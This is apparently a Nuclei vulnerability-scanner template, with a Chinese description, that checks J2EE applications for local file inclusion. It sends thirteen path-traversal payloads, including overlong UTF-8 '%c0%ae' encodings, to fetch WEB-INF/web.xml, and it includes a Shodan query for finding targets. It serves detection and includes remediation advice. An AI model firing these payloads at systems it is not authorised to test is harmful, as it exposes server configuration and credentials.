id: generic-j2ee-lfi

info:
  name: Generic J2EE 本地文件包含 Scan Panel - 检测
  author: davidfegyver
  severity: high
  description: |
    该模板用于检测 Generic J2EE 本地文件包含 Scan Panel - 检测。该类漏洞通常源于文件路径或资源参数校验不足，导致攻击者可读取非预期文件。模板主要向 `{变量}` 等路径发送探测请求，并根据响应中的 `<servlet-name>`、`</web-app>` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可读取服务器本地文件、配置文件、源码或系统敏感文件。
    - 若读取到凭据、密钥或应用配置，可能进一步造成账号接管、数据库访问或远程代码执行。
  remediation: |
    - 使用固定文件 ID 或白名单映射访问文件，避免直接使用用户输入拼接文件路径。
    - 对路径进行规范化校验，拒绝目录穿越、协议包装器和绝对路径访问。
    - 降低 Web 进程文件权限，检查是否已有敏感文件被访问或泄露。
  reference:
    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LFIModule.java
    - https://gist.github.com/harisec/519dc6b45c6b594908c37d9ac19edbc3
  classification:
    cwe-id: CWE-23,CWE-73
  metadata:
    verified: true
    max-request: 13
    shodan-query: http.title:"J2EE"
  tags: lfi,generic,j2ee,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}{{paths}}"
    payloads:
      paths:
        - "/../../../../WEB-INF/web.xml"
        - "/../../../WEB-INF/web.xml"
        - "/../../WEB-INF/web.xml"
        - "/%c0%ae/%c0%ae/WEB-INF/web.xml"
        - "/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
        - "/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
        - "/../../../WEB-INF/web.xml;x="
        - "/../../WEB-INF/web.xml;x="
        - "/../WEB-INF/web.xml;x="
        - "/WEB-INF/web.xml"
        - "/.//WEB-INF/web.xml"
        - "/../WEB-INF/web.xml"
        - "/%c0%ae/WEB-INF/web.xml"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<servlet-name>"
          - "</web-app>"
        condition: and

      - type: status
        status:
          - 200
